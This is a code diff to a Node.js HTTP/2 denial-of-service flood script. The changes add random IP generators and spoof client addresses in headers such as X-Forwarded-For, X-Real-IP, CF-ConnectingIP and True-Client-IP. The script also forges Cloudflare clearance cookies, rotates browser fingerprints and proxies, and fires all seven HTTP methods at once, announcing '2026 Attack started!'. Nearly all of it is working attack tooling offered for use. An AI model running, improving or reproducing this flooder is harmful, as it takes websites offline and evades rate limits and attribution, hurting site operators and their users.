@@ -119,6 +119,7 @@ const platform2026 = [
   "Other"
 ];
 
+
 // 2026 Cipher suites
 const cplist = [
   'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_GCM_SHA256',
@@ -543,7 +544,6 @@ const accept_header = [
 
 ];
 
-
 // 2026 Language headers
 const lang_header = [
   'en-US,en;q=0.9',
@@ -772,12 +772,13 @@ const sigalgs = [
       'rsa_pkcs1_sha384',
       'rsa_pkcs1_sha512',
   ];
+
   let concu = sigalgs.join(':');
 
 // 2026 OS Versions
 const osVersions = {
     'Windows': ['10.0', '11.0', '12.0', '10.0.22621', '11.0.22631', '12.0.26100'],
-    'Android': ['13.0', '14.0', '15.0', '16.0', '13.0.0', '14.0.0', '15.0.0', '16.0.0', '12.0', '12.1', '13.1', '14.1'],
+    'Android': ['13.0', '14.0', '15.0', '16.0', '13.0.0', '14.0.0', '15.0.0', '16.0.0', '12.0', '12.1'],
     'iOS': ['15_0', '15_1', '15_2', '15_3', '15_4', '15_5', '15_6', '15_7', '16_0', '16_1', '16_2', '16_3', '16_4', '16_5', '16_6', '16_7', '17_0', '17_1', '17_2', '17_3', '17_4', '17_5', '17_6', '17_7', '18_0', '18_1', '18_2', '18_3', '18_4', '18_5', '19_0', '19_1'],
     'macOS': ['13.0', '13.1', '13.2', '13.3', '13.4', '13.5', '13.6', '14.0', '14.1', '14.2', '14.3', '14.4', '14.5', '14.6', '15.0', '15.1', '15.2', '15.3', '16.0', '16.1'],
     'Linux': ['6.8.0', '6.9.0', '6.10.0', '6.11.0', '6.12.0', '6.13.0', '6.14.0', '6.15.0', '6.16.0'],
@@ -790,14 +791,12 @@ const chromeVersions = [
     '143.0.7485.45', '143.0.7485.98', '144.0.7523.67', '144.0.7523.112',
     '145.0.7568.34', '145.0.7568.89', '146.0.7604.56', '146.0.7604.123',
     '147.0.7642.78', '147.0.7642.145', '148.0.7681.23', '148.0.7681.89',
-    '149.0.7715.12', '149.0.7715.67', '150.0.7750.34', '150.0.7750.98',
-    '151.0.7784.56', '151.0.7784.123', '152.0.7820.45', '152.0.7820.89'
+    '149.0.7715.12', '149.0.7715.67', '150.0.7750.34', '150.0.7750.98'
 ];
 
 const edgeVersions = [
     '141.0.7390.108', '141.0.7390.123', '142.0.7445.89', '142.0.7445.123',
-    '143.0.7485.45', '143.0.7485.98', '144.0.7523.67', '144.0.7523.112',
-    '145.0.7568.34', '145.0.7568.89', '146.0.7604.56', '146.0.7604.123'
+    '143.0.7485.45', '143.0.7485.98', '144.0.7523.67', '144.0.7523.112'
 ];
 
 const firefoxVersions = [
@@ -826,7 +825,6 @@ const iosVersions = [
     '17.5', '17.4', '17.3', '17.2', '17.1', '17.0', '16.7', '16.6', '16.5'
 ];
 
-// 2026 Updated devices
 const devices = [
     'iPhone 17 Pro', 'iPhone 17 Pro Max', 'iPhone 17', 'iPhone 16 Pro Max',
     'iPhone 16 Pro', 'iPhone 16 Plus', 'iPhone 16', 'iPhone 15 Pro Max',
@@ -835,10 +833,7 @@ const devices = [
     'Galaxy S26', 'Galaxy Z Fold 7', 'Galaxy Z Flip 7', 'Galaxy A56', 'Galaxy A36',
     'Pixel 10 Pro', 'Pixel 10 Pro XL', 'Pixel 10', 'Pixel 9 Pro Fold',
     'Pixel 9 Pro', 'Pixel 9', 'Xiaomi 15 Ultra', 'Xiaomi 15 Pro', 'Xiaomi 15',
-    'Redmi Note 14 Pro+', 'OnePlus 13', 'OnePlus 13R', 'Nothing Phone 3',
-    'Motorola Edge 50 Ultra', 'Oppo Find X8 Pro', 'Realme GT 7 Pro',
-    'iPad Pro 13-inch (M6)', 'iPad Pro 11-inch (M6)', 'MacBook Pro 16-inch (M5)',
-    'MacBook Air 15-inch (M5)', 'Samsung Galaxy Tab S10 Ultra'
+    'Redmi Note 14 Pro+', 'OnePlus 13', 'OnePlus 13R', 'Nothing Phone 3'
 ];
 
 const webkitVersions = [
@@ -849,6 +844,27 @@ const webkitVersions = [
 
 const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
 const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND'];
+
+// ============= RANDOM IP GENERATOR FUNCTIONS =============
+function randomIp() {
+  return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
+}
+
+function randomRealisticIp() {
+  // Generate IP in realistic ranges (skip reserved blocks)
+  const firstOctet = Math.floor(Math.random() * 223) + 1;
+  if (firstOctet === 127) return randomIp();
+  return `${firstOctet}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
+}
+
+function randomForwardedChain() {
+  const chainLength = Math.floor(Math.random() * 5) + 1;
+  const chain = [];
+  for (let i = 0; i < chainLength; i++) {
+    chain.push(randomIp());
+  }
+  return chain.join(', ');
+}
 
 // ============= HELPER FUNCTIONS =============
 const headerFunc = {
@@ -863,7 +879,6 @@ const headerFunc = {
   site() { return fetch_site[Math.floor(Math.random() * fetch_site.length)]; },
   countrys() { return country[Math.floor(Math.random() * country.length)]; },
   type() { return type_list[Math.floor(Math.random() * type_list.length)]; },
-  
 }
 
 function randstr(length) {
@@ -956,16 +971,13 @@ function generateUserAgent2026() {
     return userAgent;
 }
 
-// 2026 sec-ch-ua generator
 function generateSecChUA2026() {
     const brandOptions = [
         { brand: 'Chromium', version: Math.floor(Math.random() * 50) + 130 },
         { brand: 'Google Chrome', version: Math.floor(Math.random() * 30) + 140 },
         { brand: 'Microsoft Edge', version: Math.floor(Math.random() * 30) + 140 },
         { brand: 'Brave', version: Math.floor(Math.random() * 30) + 140 },
-        { brand: 'Opera', version: Math.floor(Math.random() * 30) + 110 },
-        { brand: 'Vivaldi', version: Math.floor(Math.random() * 20) + 7 },
-        { brand: 'Samsung Browser', version: Math.floor(Math.random() * 10) + 25 }
+        { brand: 'Opera', version: Math.floor(Math.random() * 30) + 110 }
     ];
     
     const shuffled = brandOptions.sort(() => 0.5 - Math.random());
@@ -1042,11 +1054,12 @@ if (cluster.isMaster) {
   console.log(`║ THREAD:`.rainbow + process.argv[4].gray);
   console.log(`║ PROXIES:`.rainbow + proxys.length.gray);
   console.log(`║ METHODS: GET | POST | PUT | DELETE | HEAD | OPTIONS | PATCH`.green);
+  console.log(`║ RANDOM IP: ENABLED (X-Forwarded-For + CF-ConnectingIP)`.green);
   console.log(`║ MODE: ALL 7 METHODS SENT TOGETHER`.green);
   console.log(`║ BROWSERS: Chrome 141-152 | Firefox 130-138 | Safari 604-620`.cyan);
   console.log(`║ OS: Windows 11/12 | macOS Sequoia | Android 16 | iOS 19`.cyan);
   console.log(`╚════════════════════════════════════════════════════════════╝`.rainbow);
-  console.log(`\n[!] 2026 Attack started! Sending ALL 7 HTTP methods simultaneously!`.green);
+  console.log(`\n[!] 2026 Attack started! Random IPs generated for each request!`.green);
   console.log(`[!] Using modern browser fingerprints...`.yellow);
   
   for (let _ of Array.from({length: thread})) {
@@ -1072,6 +1085,10 @@ function flood() {
   var parsed = new URL(target);
   var cipper = headerFunc.cipher();
   var proxy = proxyr();
+  
+  // Generate random spoofed IPs for this request batch
+  const spoofedIp = randomRealisticIp();
+  const forwardedChain = randomForwardedChain();
   
   function generateRandomString(length) {
     const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
@@ -1099,14 +1116,19 @@ function flood() {
   
   const randomPath = `/${randstr(10)}?${randstr(5)}=${randstr(8)}&_=${Date.now()}&t=${Math.random()}`;
   
-  // BASE HEADERS (SAME FOR ALL METHODS)
+  // BASE HEADERS WITH RANDOM IP SPOOFING
   const baseHeaders = {
     ':authority': parsed.host,
     ":path": parsed.path ? parsed.path + randomPath : randomPath,
     ":scheme": parsed.protocol.replace(':', ''),
     'Cache-Control': headerFunc.controling(),
     'Accept-Encoding': headerFunc.encoding(),
-    'X-Forwarded-For': proxy[0],
+    'X-Forwarded-For': forwardedChain,
+    'X-Real-IP': spoofedIp,
+    'X-Originating-IP': randomIp(),
+    'X-Remote-IP': randomIp(),
+    'X-Remote-Addr': randomIp(),
+    'X-Client-IP': randomIp(),
     'sec-ch-ua': selectedValue,
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': headerFunc.platforms(),
@@ -1127,9 +1149,11 @@ function flood() {
     'cf-cache-status': 'BYPASS',
     'sec-ch-ua-platform-version': '0.1.0',
     'Cookie': "cf_clearance=" + randstr(43) + "-" + randstrsValue + "-0-1-" + randstr(8) + "." + randstr(8) + "." + randstr(8) + "-" + randstrs(3) + "." + "2" + "." + randstrsValue,
-    'CF-ConnectingIP': proxy[0],
+    'CF-ConnectingIP': spoofedIp,
     'CF-Worker': parsed.host,
     'X-Forwarded-Proto': 'https',
+    'True-Client-IP': randomIp(),
+    'X-Proxy-IP': randomIp(),
   };
   
   const postData = getPostData();
@@ -1173,7 +1197,7 @@ function flood() {
     ciphers: cipper,
     secureProtocol: ["TLS_client_method", "TLS_method", "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
     sigals: concu,
-    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
     echdCurve: "auto",
     secure: true,
     Compression: false,
@@ -1213,8 +1237,25 @@ function flood() {
         for (let i = 0; i < rps; i++) {
           for (const method of HTTP_METHODS) {
             try {
-              const headers = methodHeaders[method];
-              const request = client.request(headers)
+              // Generate FRESH random IPs for EACH request in the loop
+              const freshSpoofedIp = randomRealisticIp();
+              const freshForwardedChain = randomForwardedChain();
+              
+              // Update headers with new random IPs for each request
+              const freshHeaders = {
+                ...methodHeaders[method],
+                'X-Forwarded-For': freshForwardedChain,
+                'X-Real-IP': freshSpoofedIp,
+                'X-Originating-IP': randomIp(),
+                'X-Remote-IP': randomIp(),
+                'X-Remote-Addr': randomIp(),
+                'X-Client-IP': randomIp(),
+                'CF-ConnectingIP': freshSpoofedIp,
+                'True-Client-IP': randomIp(),
+                'X-Proxy-IP': randomIp(),
+              };
+              
+              const request = client.request(freshHeaders)
                 .on("response", response => {
                   request.close();
                   request.destroy();
